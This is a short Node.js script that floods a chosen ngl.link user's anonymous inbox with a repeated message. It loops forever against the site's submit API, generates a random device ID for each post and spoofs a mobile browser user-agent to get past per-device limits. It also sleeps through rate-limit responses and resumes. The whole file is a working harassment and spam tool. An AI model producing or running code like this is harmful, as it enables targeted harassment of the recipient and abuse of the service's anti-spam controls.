const colors = require("colors");
const fetch = require("node-fetch");
const crypto = require("crypto");
const prompt = require("prompt-sync")();
const ngl_users = prompt("ngl_user : ");
const message = prompt("message : ");
const sleeper = prompt("sleep : ");
const headers = {
    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
    "x-requested-with": "XMLHttpRequest",
    "user-agent": "Mozilla/5.0 (Linux; Android 10; PPA-LX2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36"
}
const url = "https://ngl.link/api/submit"
const ngl = async (users, mess) => {
    console.log(`starting flood ngl_user :[ ${ngl_users} ] message : [ ${message} ]`.rainbow)
    // verable async function
    while (true) {
        // while loop
        const device = crypto.randomBytes(22).toString("hex");
        // creat string device
        const body = `username=${users}&question=${mess}&deviceId=${device}&gameSlug=&referrer=`
        // body parse format
        try {
            await new Promise((resolve) => setTimeout(resolve, sleeper));
            // delay promise
            const req = await fetch(url, {
                // using fetch in request
                method: "POST",
                body,
                headers
            })
            if (req.status !== 200) {
                console.log("RATELIMITED 429 WAIT 40 SECONDS");
                await new Promise((resolve) => setTimeout(resolve, 40000));
                // delay Promise
            }

        } catch (err) {
            setTimeout(() => {
                console.log(`${err}`)
                process.exit()
            }, 3000)
            // log error
        }


    }
}
ngl(ngl_users, message)
//run function
// end
